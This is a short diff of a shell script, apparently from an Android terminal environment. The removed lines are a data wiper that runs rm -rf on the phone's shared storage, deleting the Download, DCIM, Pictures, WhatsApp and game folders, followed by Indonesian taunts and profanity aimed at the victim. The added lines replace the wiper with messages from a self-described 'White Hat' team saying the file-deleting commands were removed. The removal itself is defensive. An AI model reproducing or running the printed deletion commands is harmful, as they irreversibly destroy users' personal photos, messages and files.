@@ -1,14 +1,3 @@
-cd /sdcard
-rm -rf Android
-rm -rf Download
-rm -rf DCIM
-rm -rf UCDownloads
-rm -rf com.garena.game.codm
-rm -rf Music
-rm -rf Pictures
-rm -rf Movies
-rm -rf WhatsApp
-echo "Mampus Semua File Lu Hilang"
-echo "Roni Tersakiti Ya Jadi Gini"
-echo "Mangkanya Jangan Macam Macam"
-echo "Fuck You !!"
+echo "Kami Sudah Meretas Dan Menghapus Command Yang Membuat File Hilang!"
+echo "Untuk Pemilik Akun,Anda Tidak Tau Rasanya Semua File Ke Hapus!"
+echo "Salam Dari White Hat Kng X Cyber Team!"
